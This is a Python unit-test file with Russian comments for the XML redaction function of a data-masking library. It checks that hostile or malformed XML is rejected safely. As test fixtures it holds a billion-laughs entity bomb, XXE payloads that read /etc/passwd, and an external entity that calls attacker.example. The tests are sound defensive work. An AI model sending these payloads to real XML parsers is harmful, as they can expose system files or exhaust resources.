"""Безопасность и устойчивость XML-маскировки (``redact_xml`` из Block M).

Фокус: защита от entity-expansion (DOCTYPE/ENTITY, «billion laughs»),
XXE/внешние сущности, мягкая деградация некорректного XML в ``ValueError``
(а не голый ``ParseError`` наружу), отбрасывание комментариев, глубокая
вложенность. Тесты детерминированы: без рандома и времени.

Проверяется ФАКТИЧЕСКОЕ поведение исходника ``datashield/structured.py``.
"""
import unittest
import xml.etree.ElementTree as ET

from datashield.api import build_engine
from datashield.structured import redact_format, redact_xml


class DoctypeEntityRejectionTests(unittest.TestCase):
    """``<!DOCTYPE`` / ``<!ENTITY`` отклоняются до парсинга."""

    def test_doctype_raises_value_error(self):
        with self.assertRaises(ValueError):
            redact_xml("<!DOCTYPE foo><root>x</root>")

    def test_entity_declaration_raises_value_error(self):
        with self.assertRaises(ValueError):
            redact_xml('<root><!ENTITY a "b">x</root>')

    def test_doctype_with_xml_declaration_raises(self):
        text = '<?xml version="1.0"?>\n<!DOCTYPE foo>\n<root>x</root>'
        with self.assertRaises(ValueError):
            redact_xml(text)

    def test_error_message_does_not_leak_payload(self):
        # Сообщение об ошибке не должно содержать сырьё из входа.
        secret = "supersecret@leak.example"
        try:
            redact_xml(f'<!DOCTYPE foo [<!ENTITY x "{secret}">]><root>x</root>')
            self.fail("ожидался ValueError")
        except ValueError as exc:
            self.assertNotIn(secret, str(exc))

    def test_doctype_substring_in_text_is_rejected(self):
        # Подстроковая защита: даже «DOCTYPE» в содержимом блокирует обработку.
        # Это безопасный over-reject — никогда не возвращаем сырьё.
        with self.assertRaises(ValueError):
            redact_xml("<root>the word <!DOCTYPE appears here</root>")


class BillionLaughsTests(unittest.TestCase):
    """«Bomba lol» (billion laughs) не раскрывается и не вешает процесс."""

    LOL_BOMB = (
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE lolz [\n"
        ' <!ENTITY lol "lol">\n'
        ' <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
        ' <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
        "]>\n"
        "<lolz>&lol3;</lolz>"
    )

    def test_billion_laughs_raises_value_error(self):
        with self.assertRaises(ValueError):
            redact_xml(self.LOL_BOMB)

    def test_billion_laughs_does_not_expand(self):
        # Защита срабатывает до парсинга → раскрытия сущностей не происходит.
        try:
            redact_xml(self.LOL_BOMB)
            self.fail("ожидался ValueError")
        except ValueError as exc:
            self.assertNotIn("lollol", str(exc))


class InvalidXmlBecomesValueErrorTests(unittest.TestCase):
    """Некорректный XML → ``ValueError``, а не голый ``ParseError`` наружу."""

    def test_unclosed_tag_raises_value_error(self):
        with self.assertRaises(ValueError):
            redact_xml("<root><unclosed></root>")

    def test_unclosed_tag_is_not_bare_parse_error(self):
        # Наружу не должен «протекать» ET.ParseError — только ValueError.
        with self.assertRaises(ValueError):
            redact_xml("<root>")
        # ParseError является подклассом SyntaxError, не ValueError —
        # проверим, что его НЕ ловит assertRaises(ParseError) после обёртки.
        try:
            redact_xml("<root><a></b></root>")
        except ValueError:
            pass  # ожидаемо
        except ET.ParseError:
            self.fail("ParseError протёк наружу вместо ValueError")

    def test_garbage_input_raises_value_error(self):
        with self.assertRaises(ValueError):
            redact_xml("not xml at all <<< >>>")

    def test_empty_string_raises_value_error(self):
        # Пустой вход — не валидный XML-документ → ValueError.
        with self.assertRaises(ValueError):
            redact_xml("")

    def test_undefined_entity_reference_raises_value_error(self):
        # Ссылка на необъявленную сущность (без DOCTYPE) — ParseError → ValueError.
        with self.assertRaises(ValueError):
            redact_xml("<root>&xxe;</root>")


class ExternalEntityTests(unittest.TestCase):
    """Внешние сущности (XXE) не подтягиваются: файл не читается."""

    def test_xxe_system_entity_rejected_before_parse(self):
        xxe = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<root>&xxe;</root>"
        )
        with self.assertRaises(ValueError):
            redact_xml(xxe)

    def test_xxe_does_not_leak_file_contents(self):
        # Гарантия: содержимое /etc/passwd (маркер "root:") не попадает
        # ни в результат, ни в текст исключения.
        xxe = (
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            "<root>&xxe;</root>"
        )
        try:
            out = redact_xml(xxe)
            self.assertNotIn("root:", out)
            self.fail("ожидался ValueError (DOCTYPE)")
        except ValueError as exc:
            self.assertNotIn("root:", str(exc))

    def test_external_parameter_entity_rejected(self):
        # Внешняя параметрическая сущность (% ...) тоже несёт DOCTYPE → reject.
        payload = (
            '<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker.example/x">%ext;]>'
            "<r>x</r>"
        )
        with self.assertRaises(ValueError):
            redact_xml(payload)


class CommentsDroppedTests(unittest.TestCase):
    """Комментарии отбрасываются: потенциальные PII в них не утекают."""

    def test_comment_is_removed_from_output(self):
        out = redact_xml("<root><!-- secret note --><a>hi</a></root>")
        self.assertNotIn("<!--", out)
        self.assertNotIn("secret note", out)

    def test_comment_with_pii_does_not_leak(self):
        # Даже email внутри комментария исчезает (узел отброшен целиком).
        out = redact_xml("<root><!-- ping john@example.com --><a>ok</a></root>")
        self.assertNotIn("john@example.com", out)
        self.assertNotIn("[EMAIL_1]", out)  # комментарий не маскируется, а удаляется
        self.assertIn("<a>ok</a>", out)


class DeepNestingTests(unittest.TestCase):
    """Глубокая, но валидная вложенность в пределах лимита обрабатывается без
    утечки сырья; за пределами лимита — аккуратный ValueError, а не
    RecursionError и тем более не выдача сырья."""

    def test_moderately_deep_valid_xml_is_masked(self):
        depth = 150  # комфортно ниже _MAX_DEPTH=200
        deep = "<r>" + "<a>" * depth + "leak@example.com" + "</a>" * depth + "</r>"
        out = redact_xml(deep)
        self.assertNotIn("leak@example.com", out)
        self.assertIn("[EMAIL_1]", out)
        # структура сохранена: ровно depth открывающих тегов <a>
        self.assertEqual(out.count("<a>"), depth)

    def test_deeply_nested_xml_does_not_emit_raw(self):
        depth = 180  # всё ещё ниже лимита — гарантируем отсутствие сырья
        deep = "<r>" + "<a>" * depth + "card 4111-1111-1111-1111" + "</a>" * depth + "</r>"
        out = redact_xml(deep)
        self.assertNotIn("4111-1111-1111-1111", out)

    def test_excessively_deep_xml_raises_valueerror_not_recursionerror(self):
        # Регрессия Block M: walk() ограничен по глубине (_MAX_DEPTH). Очень
        # вложенный валидный XML отвергается ValueError, а НЕ RecursionError,
        # и сырьё при этом не появляется (исключение до сериализации).
        depth = 600  # заведомо больше _MAX_DEPTH=200
        deep = "<r>" + "<a>" * depth + "leak@example.com" + "</a>" * depth + "</r>"
        with self.assertRaises(ValueError):
            redact_xml(deep)


class DispatcherSecurityTests(unittest.TestCase):
    """Диспетчер ``redact_format(..., 'xml')`` сохраняет защиту."""

    def test_dispatcher_rejects_doctype(self):
        with self.assertRaises(ValueError):
            redact_format("<!DOCTYPE x><root/>", "xml")

    def test_dispatcher_rejects_invalid_xml(self):
        with self.assertRaises(ValueError):
            redact_format("<root>", "xml")

    def test_dispatcher_passes_engine_through(self):
        # Явный движок не ломает защиту и маскирует значение.
        eng = build_engine()
        out = redact_format("<r>a@b.com</r>", "xml", eng)
        self.assertIn("[EMAIL_1]", out)
        self.assertNotIn("a@b.com", out)


class NeverEmitsRawTests(unittest.TestCase):
    """Сводный инвариант: на отклонённых входах сырьё не возвращается наружу."""

    def test_rejected_inputs_raise_and_return_nothing(self):
        hostile = [
            '<!DOCTYPE foo><root>secret@leak.test</root>',
            '<root><!ENTITY a "b">secret@leak.test</root>',
            "<root>&undefined;</root>",
            "<broken><a></root>",
        ]
        for text in hostile:
            with self.assertRaises(ValueError, msg=text):
                redact_xml(text)


if __name__ == "__main__":
    unittest.main()
